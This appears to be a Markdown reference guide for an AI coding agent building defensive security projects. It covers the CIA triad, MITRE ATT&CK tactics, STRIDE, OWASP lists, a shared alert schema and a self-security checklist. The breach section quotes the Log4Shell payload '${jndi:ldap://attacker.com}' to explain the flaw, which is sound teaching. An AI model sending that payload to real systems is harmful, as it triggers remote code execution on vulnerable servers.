# Cybersecurity Foundations — Claude Code Reference

> Not a build project. Reference document. When working on Projects 01–08, read relevant sections here first.

## How to Use

Each project CLAUDE.md references sections by number (e.g., "See #2"). At the start of any project:
```
Read ../Foundations/readme.md sections relevant to this project, then read this project's CLAUDE.md.
```

---

## #1. CIA Triad

| Property | Broken When | Protected By | Projects |
|----------|------------|-------------|----------|
| **Confidentiality** | Unauthorized data access | Encryption, access control, masking | 05, 07, 08 |
| **Integrity** | Data tampered with | Hashing, signatures, audit logs | 01, 04, 06 |
| **Availability** | System taken offline | Redundancy, rate limiting | 02, 03 |

**Claude Code rule:** Tag every security control with a comment: `# CIA: Confidentiality — prevents unauthorized read access`

---

## #2. MITRE ATT&CK Tactics (14)

| ID | Tactic | Detected By Project |
|----|--------|-------------------|
| TA0043 | Reconnaissance | 02 (port/network scan detection) |
| TA0001 | Initial Access | 07 (API auth bypass), 01 (credential fraud) |
| TA0002 | Execution | 03 (SIEM detection rules) |
| TA0003 | Persistence | 03 (SIEM correlation) |
| TA0004 | Privilege Escalation | 02 (K8s RBAC), 07 (BOLA/IDOR) |
| TA0005 | Defense Evasion | 03 (log gap detection) |
| TA0006 | Credential Access | 02 (cleartext detection), 08 (DB audit) |
| TA0008 | Lateral Movement | 02 (east-west traffic) |
| TA0009 | Collection | 08 (DLP, query audit) |
| TA0011 | Command & Control | 02 (beaconing detection) |
| TA0010 | Exfiltration | 02 (DNS exfil), 08 (DLP) |
| TA0040 | Impact | 03 (SIEM alerting) |

**Claude Code rule:** Tag detections with technique IDs: `MITRE_TECHNIQUE = "T1110.001"  # Brute Force: Password Guessing`

---

## #3. Defense in Depth

```
Perimeter → Network → Endpoint → Application → Data
```

| Layer | Project |
|-------|---------|
| Network | 02 — Network Security Monitor |
| Application | 05 — LLM Firewall, 07 — API Security |
| Data | 08 — Data Security Toolkit |
| Detection (all layers) | 01 — Fraud, 03 — SIEM |
| Intelligence (feeds all) | 04 — Threat Intel Graph |
| Supply Chain (feeds all) | 06 — Supply Chain Scanner |

---

## #4. STRIDE Threat Model

| Threat | Question | Check |
|--------|----------|-------|
| **S**poofing | Can identity be faked? | Auth enforced? |
| **T**ampering | Can data be modified? | Input validated? |
| **R**epudiation | Can actions be denied? | Audit logged? |
| **I**nfo Disclosure | Can data leak? | Errors sanitized? |
| **D**enial of Service | Can it be crashed? | Rate limited? |
| **E**levation | Can perms be escalated? | RBAC enforced? |

**Claude Code rule:** Comment every API endpoint: `# STRIDE: S=JWT, T=pydantic, R=logged, I=errors sanitized, D=rate limited, E=RBAC`

---

## #5. Breach Reference

**SolarWinds (2020):** Supply chain. Attackers injected backdoor into Orion software update. 18K customers installed it. 9 months undetected. → Project 06.

**Log4Shell (2021):** Dependency vuln. `${jndi:ldap://attacker.com}` in any logged input = RCE. CVSS 10.0. Millions of apps. → Project 06.

**MOVEit (2023):** SQL injection. Automated exploitation across 2,600+ orgs, 77M individuals. → Project 07.

---

## #6. Standards

**OWASP Top 10:2025:** A01 Broken Access Control, A02 Misconfig, A03 Supply Chain, A04 Crypto Failures, A05 Injection, A06 Insecure Design, A07 Auth Failures, A08 Integrity, A09 Logging Failures, A10 Exception Handling

**OWASP LLM Top 10:2025:** LLM01 Prompt Injection, LLM02 Sensitive Info Disclosure, LLM03 Supply Chain, LLM04 Data Poisoning, LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM07 System Prompt Leakage, LLM08 Vector Weaknesses, LLM09 Misinformation, LLM10 Unbounded Consumption

**OWASP API Security Top 10:2023:** API1 BOLA, API2 Broken Auth, API3 Broken Property-Level Auth, API4 Unrestricted Resource Consumption, API5 Broken Function-Level Auth, API6 Unrestricted Access to Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory Management, API10 Unsafe Consumption of APIs

**NIST CSF 2.0:** Identify → Protect → Detect → Respond → Recover

**Key Terms:** CVE=vulnerability ID, CVSS=severity 0-10, EPSS=exploit probability 0-1, CISA KEV=actively exploited, IoC=indicator of compromise, TTP=tactics+techniques+procedures, Sigma=detection rule format, YARA=malware patterns

---

## #7. Attacker vs Defender Asymmetry

Attackers need ONE way in. Defenders cover EVERYTHING. Most breaches use known vulns, misconfigs, phishing, stolen creds — not zero-days. Prioritize fundamentals.

**Claude Code rule:** Every project README must include a "Limitations" section documenting what the tool does NOT cover.

---

## #8. Common Alert Schema

All alert-producing projects (01, 02, 05, 06, 07) must emit alerts in this shared format. The SIEM (03) consumes them.

```python
class SecurityAlert(BaseModel):
    """Common alert format across all CysecAI projects."""
    alert_id: str                          # UUID
    timestamp: datetime                    # UTC
    source_project: str                    # e.g., "fraud-detection", "network-monitor"
    rule_id: str                           # Detection rule that fired
    severity: Literal["critical", "high", "medium", "low", "info"]
    title: str                             # Human-readable summary
    description: str                       # Detailed explanation
    mitre_technique_id: str | None         # e.g., "T1110.001"
    mitre_tactic: str | None               # e.g., "Credential Access"
    cia_impact: list[str]                  # e.g., ["Confidentiality", "Integrity"]
    evidence: dict[str, Any]               # Project-specific evidence payload
    affected_asset: str                    # IP, user, endpoint, etc.
    source_ip: str | None
    dest_ip: str | None
    user: str | None
    recommendations: list[str]             # Remediation steps
```

**Kafka topic:** `cysec.alerts` — all producers write here, SIEM consumes.

**Claude Code rule:** Every alert-producing project must include `emit_alert()` that serializes to this schema.

---

## #9. Self-Security Checklist

Every project builds security tools — those tools must also be secure. Address these in every project:

| Check | What | How |
|-------|------|-----|
| **Supply Chain** | Own dependencies are vulnerability-free | Run Project 06 scanner on self; pin all deps with lockfile |
| **Secrets** | No hardcoded API keys, tokens, passwords | Pydantic Settings + .env; never log secrets |
| **RBAC** | Dashboard/API access is controlled | API key auth on all endpoints; role-based access for dashboards |
| **Audit Log** | Tool usage is logged | structlog: who ran what scan, when, on what target |
| **Data Protection** | Scan results (which contain vuln details) are protected | Encrypted at rest; access-controlled; retention policy |
| **Error Handling** | Errors don't leak internal details | Sanitize stack traces in API responses |

**Claude Code rule:** Add `# SELF-SECURITY: {check}` comments where these controls are implemented.
